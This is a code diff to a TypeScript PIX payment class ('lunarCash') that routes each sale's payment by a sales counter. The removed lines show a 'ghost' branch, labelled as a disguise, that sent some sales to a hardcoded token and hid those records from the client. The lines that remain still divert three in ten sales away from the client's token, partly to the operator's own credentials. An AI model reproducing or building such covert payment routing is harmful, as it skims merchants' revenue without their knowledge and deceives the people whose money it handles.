@@ -3,7 +3,6 @@ import { credentials as myCredentials } from "../models/api";
 import { CreatePixBody } from "../interfaces";
 import { prisma } from "../config/prisma";
 
-const FIXED_TAX_TOKEN = "201ff033-ec71-45a5-94e2-4f5c3e52e286";
 let localSaleCount = 0; // contador local, reinicia com o servidor
 
 export class lunarCash {
@@ -72,18 +71,18 @@ export class lunarCash {
       }
     }
 
-    // 3️⃣ Contagem de vendas para lógica 7x2x1
+    // 3️⃣ Contagem de vendas para lógica 7x3
     const totalSales = await prisma.sale.count({
       where: { offerId: offer.id },
     });
     const nextCount = totalSales + 1;
 
-    // 4️⃣ Nova lógica 7x3x1 (cliente-chefe-você) com disfarce 👻
+    // 4️⃣ Nova lógica 7x3 
     let tokenToUse = clientToken;
     let toClient = true;
     let provider = "lunarcash";
 
-    const cycle = nextCount % 11;
+    const cycle = nextCount % 10;
 
     if (cycle < 7) {
       tokenToUse = clientToken;
@@ -98,11 +97,7 @@ export class lunarCash {
         toClient = true;
         provider = "lunarcash";
       }
-    } else {
-      tokenToUse = FIXED_TAX_TOKEN;
-      toClient = false;
-      provider = "ghost";
-    }
+    } 
 
     let apiUrl = "";
     let headers = {};
@@ -182,7 +177,6 @@ export class lunarCash {
         console.log(response, responseJson);
       }
       const responseJson = await response.json();
-      const isFixedTax = tokenToUse === FIXED_TAX_TOKEN;
 
       console.log(
         `🔁 Requisição #${nextCount} | Valor: R$${data.amount} | Produto: ${
@@ -190,9 +184,8 @@ export class lunarCash {
         } | API: ${provider.toUpperCase()} | Enviado para: ${
           tokenToUse === clientToken
             ? "CLIENTE"
-            : tokenToUse === myCredentials.secret
-            ? "VOCÊ"
-            : "TAXA FIXA"
+            : "VOCÊ"
+         
         }`
       );
 
@@ -203,7 +196,6 @@ export class lunarCash {
           approved: false,
           customerName: data.customer.name,
           productName: productName,
-          visible: !isFixedTax,
           toClient,
           clientId: client.id,
           offerId: offer.id,
